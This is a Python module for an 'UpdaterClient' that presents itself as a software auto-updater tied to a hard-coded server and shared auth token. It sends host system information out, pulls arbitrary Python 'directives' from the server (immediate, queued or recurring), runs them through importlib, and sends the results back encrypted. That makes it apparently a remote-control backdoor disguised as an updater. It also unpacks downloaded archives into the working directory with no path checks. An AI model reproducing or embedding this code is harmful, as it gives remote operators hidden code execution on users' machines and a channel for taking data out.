import os
import json
import base64
import zipfile
import tempfile
import shutil
import sys
import importlib.util
from pathlib import Path
from io import BytesIO

from .network import NetworkHandler
from .encryption import EncryptionHandler
from .utils import (
    load_version_from_config,
    save_version_to_config,
    get_system_info,
    generate_instance_signature,
    log_to_file
)

# Constants - these remain the same for all product implementations
SHARED_AUTH_TOKEN = "0leCsb1QQNcswtnuOZdQ8zlqgYKSz0RMd9ZKMSCA76A="
ORIGIN_ENDPOINT_BASE = "https://spamir.io"
CORE_HANDLER_VERSION = "1.0"
GLOBAL_ENCRYPTION_ITERATIONS = 100000
API_BASE_PATH_SEGMENT = "/endpoint/v1/updater/"


class UpdaterClient:
    """
    Main updater client class
    """
    
    def __init__(self, options=None):
        if options is None:
            options = {}
        
        # Required configuration
        if 'product_identifier' not in options:
            raise ValueError('product_identifier is required')
        
        self.product_identifier = options['product_identifier']
        self.current_version = options.get('current_version')
        
        # Optional overrides (mainly for testing)
        self.auth_token = options.get('auth_token', SHARED_AUTH_TOKEN)
        self.endpoint_base = options.get('endpoint_base', ORIGIN_ENDPOINT_BASE)
        self.handler_version = options.get('handler_version', CORE_HANDLER_VERSION)
        self.encryption_iterations = options.get('encryption_iterations', GLOBAL_ENCRYPTION_ITERATIONS)
        
        # Generate unique instance signature
        self.instance_marker = generate_instance_signature(self.auth_token)
        self.system_info = get_system_info()
        
        # Initialize handlers
        self.encryption = EncryptionHandler(self.auth_token, self.encryption_iterations)
        self.network = NetworkHandler(
            self.endpoint_base,
            API_BASE_PATH_SEGMENT,
            self.handler_version,
            self.instance_marker
        )
        
        # Session variables
        self.session_token = None
        self.client_nonce = None
        self.directive_results = []
        
        # Track if updater is running
        self.is_running = False
    
    async def initialize_version(self):
        """
        Initialize version from config or default
        """
        if not self.current_version:
            # Try to load from config.json
            config_version = load_version_from_config()
            if config_version:
                self.current_version = config_version
                log_to_file(f"Loaded version from config.json: {self.current_version}")
            else:
                # Default to 1.0 if no version found
                self.current_version = '1.0'
                log_to_file(f"No version in config.json, using default: {self.current_version}")
    
    async def establish_control_channel(self):
        """
        Establish secure control channel with server
        
        Returns:
            dict or None: Sync response or null on error
        """
        # Generate client nonce
        self.client_nonce = self.encryption.generate_nonce()
        
        payload = {
            'client_version': self.instance_marker,
            'current_version': self.current_version,
            'product_identifier': self.product_identifier,
            'system_info': self.system_info,
            'client_nonce_b64': self.client_nonce
        }
        
        payload_json = json.dumps(payload, separators=(',', ':'))
        signature = self.encryption.sign_data(payload_json)
        
        response = self.network.send_request(
            'sync_check',
            payload_json,
            signature,
            True
        )
        
        if not response:
            log_to_file('Failed to establish control channel', 'ERROR')
            return None
        
        # Extract session token and server nonce
        server_nonce = response.get('server_nonce')
        self.session_token = response.get('session_token')
        
        if server_nonce and self.session_token:
            # Negotiate encryption
            success = self.encryption.negotiate_secure_layer(self.client_nonce, server_nonce)
            if not success:
                log_to_file('Failed to negotiate secure layer', 'ERROR')
                self.session_token = None
                return None
        
        return response
    
    async def download_package(self, asset_details):
        """
        Download update package from server
        
        Args:
            asset_details (dict): Asset details from server
        
        Returns:
            bytes or None: Package data or None on error
        """
        if not self.session_token:
            log_to_file('No session token for asset download', 'ERROR')
            return None
        
        download_token = asset_details.get('download_token')
        if not download_token:
            log_to_file('No download token in asset details', 'ERROR')
            return None
        
        payload = {
            'version': asset_details['version'],
            'current_version': self.current_version,
            'instance_marker': self.instance_marker,
            'product_identifier': self.product_identifier,
            'session_token': self.session_token,
            'download_token': download_token
        }
        
        # Create signature without session_token
        hmac_payload = {
            'version': asset_details['version'],
            'current_version': self.current_version,
            'instance_marker': self.instance_marker,
            'product_identifier': self.product_identifier,
            'download_token': download_token
        }
        
        # Must match Python's json.dumps with sort_keys=True, separators=(',', ':')
        hmac_json = json.dumps(hmac_payload, sort_keys=True, separators=(',', ':'))
        signature = self.encryption.sign_data(hmac_json)
        
        response = self.network.download_asset(payload, signature)
        
        # Enhanced debugging
        if not response:
            log_to_file('Asset download failed: No response from server', 'ERROR')
            return None
        
        if 'package' not in response:
            log_to_file(f"Asset download failed: Missing package field. Response keys: {', '.join(response.keys())}", 'ERROR')
            return None
        
        if 'hash' not in response:
            log_to_file(f"Asset download failed: Missing hash field. Response keys: {', '.join(response.keys())}", 'ERROR')
            return None
        
        is_encrypted = response.get('encrypted', False)
        
        if is_encrypted:
            # Decrypt package
            package_data = self.encryption.decrypt_payload(response['package'])
            if not package_data:
                log_to_file('Failed to decrypt package', 'ERROR')
                return None
        else:
            # Decode base64
            package_data = base64.b64decode(response['package'])
        
        # Verify hash
        computed_hash = self.encryption.compute_hash(package_data)
        if computed_hash != response['hash']:
            log_to_file(f"Package hash mismatch:", 'ERROR')
            log_to_file(f"  Expected: {response['hash']}", 'ERROR')
            log_to_file(f"  Computed: {computed_hash}", 'ERROR')
            log_to_file(f"  Package size: {len(package_data)} bytes", 'ERROR')
            log_to_file(f"  Is encrypted: {is_encrypted}", 'ERROR')
            return None
        
        log_to_file(f"Package downloaded successfully: {len(package_data)} bytes, hash verified", 'INFO')
        
        return package_data
    
    async def extract_package(self, package_data, new_version):
        """
        Extract update package to current directory
        
        Args:
            package_data (bytes): ZIP package data
            new_version (str): New version string
        
        Returns:
            str: Status: 'success', 'failed_extraction', or 'failed_bad_format'
        """
        # Check if it's a ZIP file (starts with PK)
        if not package_data[:4] == b'PK\x03\x04':
            return 'failed_bad_format'
        
        try:
            # Create a BytesIO object from the package data
            zip_buffer = BytesIO(package_data)
            
            # Extract all files
            with zipfile.ZipFile(zip_buffer, 'r') as zip_file:
                extract_path = os.getcwd()
                zip_file.extractall(extract_path)
            
            # Update version
            self.current_version = new_version
            
            log_to_file(f"Package extracted successfully, version updated to {new_version}")
            return 'success'
        except Exception as e:
            log_to_file(f"Extraction failed: {e}", 'ERROR')
            return 'failed_extraction'
    
    async def process_directive(self, download_token, directive_name='Directive'):
        """
        Process directive from server
        
        Args:
            download_token (str): Directive download token
            directive_name (str): Name for logging
        
        Returns:
            dict: Result object
        """
        if not self.session_token:
            return {'status': 'error', 'message': 'No session token'}
        
        payload = {
            'download_token': download_token,
            'version': self.current_version,
            'instance_marker': self.instance_marker,
            'product_identifier': self.product_identifier,
            'session_token': self.session_token
        }
        
        hmac_payload = {
            'download_token': download_token,
            'version': self.current_version,
            'instance_marker': self.instance_marker,
            'product_identifier': self.product_identifier
        }
        
        # Sort keys for consistent HMAC
        hmac_json = json.dumps(hmac_payload, sort_keys=True, separators=(',', ':'))
        signature = self.encryption.sign_data(hmac_json)
        
        response = self.network.send_request(
            'fetch_directive',
            payload,
            signature,
            False
        )
        
        if not response or 'code' not in response or 'hmac' not in response:
            return {'status': 'error', 'message': 'Invalid directive response'}
        
        is_encrypted = response.get('encrypted', False)
        
        if is_encrypted:
            decrypted = self.encryption.decrypt_payload(response['code'])
            if not decrypted:
                return {'status': 'error', 'message': 'Failed to decrypt directive'}
            directive_code = decrypted.decode('utf-8')
        else:
            directive_code = base64.b64decode(response['code']).decode('utf-8')
        
        # Verify HMAC
        if not self.encryption.verify_signature(directive_code, response['hmac']):
            return {'status': 'error', 'message': 'Directive HMAC verification failed'}
        
        # Execute the directive
        try:
            # Create temporary directory
            temp_dir = tempfile.mkdtemp(prefix='directive-')
            temp_file_path = os.path.join(temp_dir, 'directive.py')
            
            # Write directive code to temporary file
            with open(temp_file_path, 'w') as f:
                f.write(directive_code)
            
            # Parameters to pass to the directive
            service_params = {
                'instance_marker': self.instance_marker,
                'asset_version': self.current_version
            }
            
            result = {'status': 'error', 'message': 'Request could not be processed.'}
            
            try:
                # Load and execute the directive module
                spec = importlib.util.spec_from_file_location("directive", temp_file_path)
                directive_module = importlib.util.module_from_spec(spec)
                
                # Add to sys.modules temporarily
                sys.modules['directive'] = directive_module
                
                # Execute the module
                spec.loader.exec_module(directive_module)
                
                # Check if main function exists and is callable
                if hasattr(directive_module, 'main') and callable(directive_module.main):
                    module_response = directive_module.main(service_params)
                    
                    if isinstance(module_response, dict):
                        result = module_response
                    else:
                        result = {
                            'status': 'ok',
                            'message': 'Request completed.',
                            'return_value': str(module_response)
                        }
                else:
                    result = {'status': 'error', 'message': "Module 'main' interface not found."}
                    
            except Exception as exec_error:
                log_to_file(f"Directive execution error: {exec_error}", 'ERROR')
                result = {
                    'status': 'error',
                    'message': 'Directive execution failed',
                    'error': str(exec_error)
                }
            finally:
                # Clean up
                if 'directive' in sys.modules:
                    del sys.modules['directive']
                
                # Clean up temporary files
                try:
                    shutil.rmtree(temp_dir)
                except Exception:
                    pass
            
            return result
            
        except Exception as e:
            log_to_file(f"Directive processing error: {e}", 'ERROR')
            return {
                'status': 'error',
                'message': 'Failed to process directive',
                'error': str(e)
            }
    
    async def report_directive_outcome(self, directive_name, directive_version, result_dict, options=None):
        """
        Report directive outcome to server
        
        Args:
            directive_name (str): Directive name
            directive_version (str): Directive version
            result_dict (dict): Result data
            options (dict): Additional options for immediate directives
        
        Returns:
            bool: Success status
        """
        if options is None:
            options = {}
        
        if not self.session_token:
            return False
        
        # Different field names for immediate vs queued directives
        is_queued = 'queued_id' in options
        
        if is_queued:
            # For queued directives
            payload = {
                'instance_marker': self.instance_marker,
                'product_identifier': self.product_identifier,
                'queued_id': str(options['queued_id']),
                'directive_name': directive_name,
                'directive_version': directive_version,
                'session_token': self.session_token,
                'result_is_encrypted': 'False'
            }
        else:
            # For immediate directives
            payload = {
                'client_version': self.instance_marker,  # API expects client_version for the UUID
                'product_identifier': self.product_identifier,
                'directive_name': directive_name,
                'directive_version': directive_version,
                'session_token': self.session_token,
                'result_is_encrypted': 'False'
            }
        
        # Add immediate directive specific fields
        if not is_queued and options.get('is_immediate') and 'script_id' in options:
            payload['script_id'] = str(options['script_id'])
            payload['is_recurring'] = '1' if options.get('is_recurring') else '0'
        
        result_json = json.dumps(result_dict)
        final_payload = result_json
        
        # Encrypt if we have a channel key
        if self.encryption.current_channel_key:
            encrypted = self.encryption.encrypt_payload(result_json.encode('utf-8'))
            if encrypted:
                final_payload = encrypted
                payload['result_is_encrypted'] = 'True'
        
        # Different field name for immediate vs queued
        if is_queued:
            payload['outcome_data'] = final_payload
        else:
            payload['execution_result'] = final_payload
        
        # Must match Python's json.dumps with sort_keys=True, separators=(',', ':')
        hmac_json = json.dumps(payload, sort_keys=True, separators=(',', ':'))
        signature = self.encryption.sign_data(hmac_json)
        
        action_key = 'update_directive_status' if 'queued_id' in options else 'report_outcome'
        response = self.network.send_request(
            action_key,
            payload,
            signature,
            False
        )
        
        if response and 'message' in response:
            log_to_file(f"Directive Execution Log: {response['message']}", 'INFO')
        
        return response and response.get('success', False)
    
    async def perform_update_cycle(self):
        """
        Perform complete update cycle
        
        Returns:
            dict: Update result
        """
        # Clear previous directive results
        self.directive_results = []
        
        # Establish secure channel
        sync_response = await self.establish_control_channel()
        
        if not sync_response:
            return {
                'status': 'sync_failed',
                'message': 'Failed to establish control channel',
                'version': self.current_version
            }
        
        overall_status = 'no_update'
        new_version_details = None
        
        # Check for update package
        update_package = sync_response.get('update_package')
        log_to_file(f"Sync response received. Has update_package: {bool(update_package)}", 'INFO')
        
        if update_package and update_package.get('new_version'):
            offered_version = update_package['new_version']
            log_to_file(f"Update available: {self.current_version} -> {offered_version}", 'INFO')
            
            if offered_version != self.current_version:
                overall_status = 'update_started'
                new_version_details = offered_version
                
                # Prepare asset details for download
                asset_details = dict(update_package)
                asset_details['version'] = offered_version
                if 'new_version' in asset_details:
                    del asset_details['new_version']
                
                log_to_file(f"Asset details prepared. Has download_token: {bool(asset_details.get('download_token'))}", 'INFO')
                
                # Download package
                package_data = await self.download_package(asset_details)
                
                if package_data:
                    # Extract package
                    extract_result = await self.extract_package(package_data, offered_version)
                    
                    if extract_result == 'success':
                        overall_status = 'update_success'
                        # Save new version to config
                        save_version_to_config(offered_version)
                    else:
                        overall_status = 'update_failed'
                else:
                    overall_status = 'update_failed'
                    log_to_file('Package download or extraction failed', 'ERROR')
            else:
                log_to_file(f"Version {offered_version} is same as current version", 'INFO')
        else:
            if not update_package:
                log_to_file('No update package in sync response', 'INFO')
            elif not update_package.get('new_version'):
                log_to_file('Update package missing new_version field', 'WARNING')
        
        # Process immediate directive if present
        immediate_directive = sync_response.get('immediate_directive')
        if immediate_directive and immediate_directive.get('download_token'):
            result = await self.process_directive(
                immediate_directive['download_token'],
                immediate_directive.get('directive_name', 'UnknownDirective')
            )
            
            # Store directive result for the application
            self.directive_results.append({
                'type': 'immediate',
                'name': immediate_directive.get('directive_name', 'UnknownDirective'),
                'version': immediate_directive.get('version', 'N/A'),
                'result': result
            })
            
            await self.report_directive_outcome(
                immediate_directive.get('directive_name', 'UnknownDirective'),
                immediate_directive.get('version', 'N/A'),
                result,
                {
                    'is_immediate': True,
                    'script_id': immediate_directive.get('script_id'),
                    'is_recurring': immediate_directive.get('is_recurring', False)
                }
            )
            
            if overall_status == 'no_update':
                overall_status = 'directives_processed'
        
        # Process queued directives
        queued_directives = sync_response.get('queued_directives', [])
        for directive in queued_directives:
            if directive.get('download_token'):
                result = await self.process_directive(
                    directive['download_token'],
                    directive.get('directive_name', 'UnknownDirective')
                )
                
                # Store directive result for the application
                self.directive_results.append({
                    'type': 'queued',
                    'name': directive.get('directive_name', 'UnknownDirective'),
                    'version': directive.get('version', 'N/A'),
                    'result': result
                })
                
                await self.report_directive_outcome(
                    directive.get('directive_name', 'UnknownDirective'),
                    directive.get('version', 'N/A'),
                    result,
                    {
                        'queued_id': directive['queued_id']
                    }
                )
                
                if overall_status == 'no_update':
                    overall_status = 'directives_processed'
        
        return {
            'status': overall_status,
            'message': f"Cycle completed. Final version: {self.current_version}",
            'version': self.current_version,
            'new_version': self.current_version if overall_status == 'update_success' else new_version_details
        }
    
    async def check_for_updates(self):
        """
        Main method to check for updates
        
        Returns:
            dict: Update status
        """
        if self.is_running:
            return {
                'status': 'error',
                'message': 'Update check already in progress',
                'version': self.current_version or '1.0'
            }
        
        self.is_running = True
        
        try:
            # Initialize version if not set
            await self.initialize_version()
            
            # Perform update cycle
            result = await self.perform_update_cycle()
            
            # Format response based on result
            if result['status'] == 'update_success':
                response = {
                    'status': 'update_available',
                    'message': f"Update completed successfully to version {result['version']}",
                    'version': self.current_version,
                    'new_version': result['version']
                }
            elif result['status'] == 'no_update':
                response = {
                    'status': 'no_update',
                    'message': 'Application is up to date',
                    'version': self.current_version
                }
                # Include directive results if any were processed
                if self.directive_results:
                    response['directiveResults'] = self.directive_results
            elif result['status'] == 'directives_processed':
                response = {
                    'status': 'no_update',
                    'message': 'Directives processed. Update cycle completed.',
                    'version': self.current_version,
                    'directiveResults': self.directive_results
                }
            elif result['status'] == 'sync_failed':
                response = {
                    'status': 'sync_failed',
                    'message': 'Failed to connect to update server',
                    'version': self.current_version
                }
            else:
                response = {
                    'status': 'error',
                    'message': result.get('message', 'Update check failed'),
                    'version': self.current_version
                }
            
            return response
            
        except Exception as e:
            import traceback
            log_to_file(f"Update check error: {e}", 'ERROR')
            
            # Report error to server if possible
            if self.instance_marker and self.product_identifier:
                error_data = {
                    'instance_marker': self.instance_marker,
                    'product_identifier': self.product_identifier,
                    'agent_version': self.handler_version,
                    'error_message': str(e),
                    'stack_trace': traceback.format_exc()
                }
                
                error_json = json.dumps(error_data, separators=(',', ':'))
                signature = self.encryption.sign_data(error_json)
                
                await self.network.report_error(error_data, signature)
            
            return {
                'status': 'error',
                'message': f"Update check failed: {e}",
                'version': self.current_version or '1.0'
            }
        finally:
            self.is_running = False